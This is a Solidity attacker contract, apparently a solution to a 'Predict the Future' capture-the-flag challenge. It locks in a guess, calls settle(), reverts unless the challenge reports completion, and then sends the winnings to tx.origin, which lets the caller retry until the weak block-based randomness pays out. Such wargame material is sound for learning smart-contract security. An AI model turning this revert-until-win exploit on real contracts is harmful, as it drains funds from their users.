// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

interface IPredictTheFutureChallenge {
    function isComplete() external view returns (bool);
    function lockInGuess(uint8 n) external payable;
    function settle() external;
}

contract AttackPredictFuture {
    IPredictTheFutureChallenge public challenge;

    constructor(address _challengeAddress) {
        challenge = IPredictTheFutureChallenge(_challengeAddress);
    }

    function lockInGuess(uint8 n) external payable {
        challenge.lockInGuess{value: 1 ether}(n);
    }

    function attack() external payable {
        challenge.settle();
        
        require(challenge.isComplete(), "error: challenge not completed");
        payable(tx.origin).transfer(address(this).balance);
    }

    receive() external payable {}
}